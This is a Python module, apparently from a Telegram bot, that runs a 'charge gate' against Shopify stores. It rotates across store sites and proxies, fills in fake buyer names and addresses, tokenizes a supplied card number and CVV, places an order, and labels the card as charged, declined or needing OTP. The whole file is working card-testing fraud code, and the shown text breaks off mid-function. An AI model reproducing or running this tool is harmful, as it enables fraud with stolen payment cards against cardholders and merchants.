# ============================================================
#  Auto Shopify v5 — Shopify Payments Charge Gate
#  /shopify command in Telegram bot
#  Full GraphQL checkout flow with site rotation + proxy support
# ============================================================

import asyncio
import aiohttp
import json
import re
import random
import os
import time
import threading
from urllib.parse import urlparse

# ============================================================
#  Config
# ============================================================
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
SHOPIFY_SITES_FILE = os.path.join(DATA_DIR, "shopify_sites.json")
os.makedirs(DATA_DIR, exist_ok=True)

_bin_cache = {}
_bin_lock = threading.Lock()

# ============================================================
#  Address book
# ============================================================
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH",
}

ADDRESS_BOOK = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]

# ============================================================
#  GraphQL Queries
# ============================================================
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}fragment ProposalDetails on Proposal{delivery{__typename...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{__typename}}payment{__typename...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier __typename}name extensibilityDisplayName __typename}__typename}__typename}}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{__typename...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}}__typename}"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{sellerProposal{...ProposalDetails __typename}__typename}__typename}errors{code __typename}}__typename}}fragment ProposalDetails on Proposal{delivery{__typename}payment{__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiateInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input,attemptToken:$attemptToken,metafields:$metafields,analytics:$analytics){__typename...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code __typename}__typename}...on Throttled{pollAfter queueToken __typename}...on CheckpointDenied{redirectUrl __typename}}}fragment ReceiptDetails on Receipt{__typename...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{__typename...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}"""


# ============================================================
#  Site management
# ============================================================
def load_shopify_sites():
    if not os.path.exists(SHOPIFY_SITES_FILE):
        return []
    try:
        with open(SHOPIFY_SITES_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return []


def save_shopify_sites(sites):
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(SHOPIFY_SITES_FILE, 'w') as f:
        json.dump(sites, f, indent=2)


# ============================================================
#  Helpers
# ============================================================
def _pick_addr(url):
    dom = urlparse(url).netloc
    tld = dom.split('.')[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    return ADDRESS_BOOK["DEFAULT"]


def _extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0] or None
    except Exception:
        pass
    return None


def _extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    return message[:50]


def _parse_proxy(proxy_dict):
    """Convert our standard proxy_dict to aiohttp proxy url string."""
    if not proxy_dict:
        return None
    # proxy_dict is like {"http": "http://ip:port", "https": "http://ip:port"}
    url = proxy_dict.get("http") or proxy_dict.get("https")
    return url


def _get_bin_info(bin6):
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        import requests
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=6)
        if r.status_code == 200:
            d = r.json()
            info = {
                "brand": d.get("brand", "Unknown"),
                "type": d.get("type", "Unknown"),
                "bank": d.get("bank", "Unknown"),
                "country": d.get("country_name", "Unknown"),
                "emoji": d.get("country_flag", ""),
            }
            with _bin_lock:
                _bin_cache[bin6] = info
            return info
    except Exception:
        pass
    return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "emoji": ""}


# ============================================================
#  Fetch products from Shopify store
# ============================================================
async def _fetch_products(domain, proxy=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                if resp.status != 200:
                    return None, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower() and "product" not in text.lower():
                    return None, "Not Shopify!"
                result = (await resp.json())['products']
                if not result:
                    return None, "No Products!"

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                try:
                    price = variant.get('price', '0')
                    price = float(str(price).replace(',', ''))
                    if price < min_price and price > 0:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError):
                    continue

        if min_product:
            return min_product, None
        return None, "No Valid Products"

    except aiohttp.ClientError as e:
        return None, f"Proxy Error: {str(e)[:60]}"
    except Exception as e:
        return None, f"Error: {str(e)[:60]}"


# ============================================================
#  Core checkout flow
# ============================================================
async def _process_card(cc, mes, ano, cvv, site_url, proxy_str=None):
    gateway = "Shopify Payments"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    payment_identifier = None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl
        }

        address_info = _pick_addr(ourl)
        country_code = address_info["countryCode"]

        firstName = random.choice(FIRST_NAMES)
        lastName = random.choice(LAST_NAMES)
        email = f"{firstName.lower()}.{lastName.lower()}@{random.choice(EMAIL_DOMAINS)}"
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]

        # Fetch cheapest product
        info, err = await _fetch_products(ourl, proxy_str)
        if not info:
            return False, err or "No products", gateway, total_price, currency
        variant_id = info['variant_id']

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Step 1: Add to cart
            cart_url = ourl + '/cart/add.js'
            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json'}
            cart_resp = await session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy_str)
            if cart_resp.status != 200:
                cart_resp = await session.post(cart_url, json={'items': [{'id': int(variant_id), 'quantity': 1}]},
                                               headers={**headers, 'Content-Type': 'application/json'}, proxy=proxy_str)
            if cart_resp.status != 200:
                return False, f"Cart failed ({cart_resp.status})", gateway, total_price, currency

            # Step 2: Initiate checkout
            checkout_headers = {**headers, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            response = await session.post(url=ourl + '/checkout/', allow_redirects=True, headers=checkout_headers, proxy=proxy_str)
            checkout_url = str(response.url)

            if 'login' in checkout_url.lower():
                return False, "Site requires login", gateway, total_price, currency

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            text = await response.text()

            if not sst:
                for pat in [
                    'name="serialized-sessionToken" content="&quot;', 'name="serialized-sessionToken" content="',
                    '"serializedSessionToken":"', 'data-session-token="', '"sessionToken":"'
                ]:
                    end = '&quot;' if '&quot;' in pat else '"'
                    sst = _extract_between(text, pat, end)
                    if sst:
                        break

            if not sst:
                return False, "No session token", gateway, total_price, currency

            queueToken = _extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or _extract_between(text, '"queueToken":"', '"')
            stableId = _extract_between(text, 'stableId&quot;:&quot;', '&quot;') or _extract_between(text, '"stableId":"', '"')

            merch = _extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    _extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or str(variant_id)

            currency = _extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or \
                       _extract_between(text, '"currencyCode":"', '"') or 'USD'

            subtotal = _extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                       _extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            # Step 3: Shipping proposal
            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            params = {'operationName': 'Proposal'}

            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': '', 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None, 'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            # Send proposal twice (as original script does)
            resp_text = None
            for i in range(2):
                response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy_str)
                resp_text = await response.text()
                if i == 0:
                    await asyncio.sleep(3)

            if not resp_text:
                return False, "Empty proposal response", gateway, total_price, currency

            if 'CAPTCHA_REQUIRED' in resp_text.upper():
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError:
                return False, "Invalid JSON response", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL: {'; '.join(msgs)[:60]}", gateway, total_price, currency

            # Parse proposal
            try:
                session_data = resp_json['data']['session']
                negotiate = session_data['negotiate']
                result = negotiate['result']
                result_type = result.get('__typename', '')

                if result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency

                checkpoint_data = result.get('checkpointData')
                seller_proposal = result['sellerProposal']
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')

                if not running_total_data:
                    return False, "No runningTotal", gateway, total_price, currency
                running_total = running_total_data['value']['amount']

            except (KeyError, TypeError) as e:
                return False, f"Parse error: {str(e)[:40]}", gateway, total_price, currency

            # Extract delivery strategy
            delivery_strategy = ''
            shipping_amount = 0.0
            if delivery_data:
                dtype = delivery_data.get('__typename', '')
                if dtype == 'FilledDeliveryTerms':
                    dlines = delivery_data.get('deliveryLines', [{}])
                    if dlines:
                        strategies = dlines[0].get('availableDeliveryStrategies', [])
                        if strategies:
                            delivery_strategy = strategies[0].get('handle', '')
                            sa = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                            try:
                                shipping_amount = float(sa)
                            except:
                                pass

            # Tax
            tax_amount = 0.0
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    ta = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(ta)
            except:
                pass

            # Payment method
            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                for method in payment_data.get('availablePaymentLines', []):
                    pm = method.get('paymentMethod', {})
                    if pm.get('name') or pm.get('paymentMethodIdentifier'):
                        payment_identifier = pm.get('paymentMethodIdentifier')
                        gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'Shopify Payments')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No payment method found", gateway, total_price, currency

            # Step 4: Delivery proposal
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {'lines': [{'stableId': stableId or '1'}]}
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'value': {'amount': str(shipping_amount), 'currencyCode': currency}}
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': '', 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)

            await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy_str)

            # Step 5: Tokenize card via ShopifyCS
            formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            payload = {
                "credit_card": {
                    "month": mes, "name": f"{firstName} {lastName}",
                    "number": formatted_card, "verification_value": cvv,
                    "year": ano, "start_month": "", "start_year": "", "issue_number": ""
                },
                "payment_session_scope": f"www.{urlparse(ourl).netloc}"
            }

            token_resp = await session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy_str)
            try:
                token_data = await token_resp.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Token failed', gateway, total_price, currency
            except:
                return False, 'Token parse failed', gateway, total_price, currency

            # Step 6: Submit for completion
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': '', 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': str(shipping_amount), 'currencyCode': currency}},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [], 'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None, 'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': '', 'city': city,
                                            'countryCode': country_code, 'postalCode': s_zip,
                                            'firstName': firstName, 'lastName': lastName,
                                            'zoneCode': state, 'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': '', 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }

            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data

            submit_json = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response = await session.post(graphql_url, params={'operationName': 'SubmitForCompletion'},
                                          headers=headers, json=submit_json, proxy=proxy_str)
            text = await response.text()

            if 'CAPTCHA_REQUIRED' in text.upper():
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency

            # Parse submit response
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})

                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                result_type = submit_data.get('__typename', '')

                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        rtype = receipt.get('__typename', '')
                        if rtype == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                    else:
                        return False, "No receipt", gateway, total_price, currency

                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown')
                    return False, _extract_clean_response(reason), gateway, total_price, currency

                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    for error in errors:
                        code = error.get('code')
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency

                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency

            except json.JSONDecodeError:
                return False, f"Invalid submit JSON", gateway, total_price, currency

            # Step 7: Poll for receipt
            receipt = submit_data.get('receipt', {})
            rid = receipt.get('id') if receipt else None
            if not rid:
                return False, "No receipt ID", gateway, total_price, currency

            poll_json = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(3)
            final_text = ""

            for i in range(4):
                response = await session.post(graphql_url, params={'operationName': 'PollForReceipt'},
                                              headers=headers, json=poll_json, proxy=proxy_str)
                final_text = await response.text()

                try:
                    poll_json_resp = json.loads(final_text)
                    receipt_data = poll_json_resp.get('data', {}).get('receipt', {})
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            code = error.get('code', 'UNKNOWN_ERROR')
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        elif typename in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                except:
                    pass

                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            # Final parse
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                if result:
                    return True, result, gateway, total_price, currency
            except:
                pass

            code = _extract_between(final_text, '{"code":"', '"')
            fl = final_text.lower()
            if 'actionreq' in fl or 'action_required' in fl:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in fl:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in fl or 'declined' in fl:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
